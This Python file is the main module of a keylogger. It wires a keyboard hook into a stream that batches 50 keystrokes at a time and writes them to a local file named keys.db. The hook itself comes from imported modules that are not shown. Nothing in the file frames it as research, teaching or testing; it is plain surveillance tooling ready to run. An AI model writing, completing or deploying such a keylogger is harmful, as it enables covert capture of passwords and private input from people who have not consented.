from streams.system.stream_sys import StreamSystem
from streams.keyboard_hook_stream import KeyboardHookStream
from streams.file_write_stream import FileWriteStream
from streams.pack_stream import PackStream


class Keylogger:
    def __init__(self):
        self.stream_sys = StreamSystem()
        self.build_streams()

    def run(self):
        self.stream_sys.run()

    def build_streams(self):
        keyboard_hook = KeyboardHookStream(stream_name="key hook")
        packer = PackStream("packer", number_to_pack=50, packing_function=Keylogger.packing_keys)
        file_saver = FileWriteStream("file_saver", filename="keys.db")

        keyboard_hook.connect(packer)
        packer.connect(file_saver)

        self.stream_sys.add_stream(keyboard_hook)
        self.stream_sys.add_stream(packer)
        self.stream_sys.add_stream(file_saver)

    @staticmethod
    def packing_keys(package, new_item):
        if not package:
            return new_item
        return package + " " + new_item

if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.run()
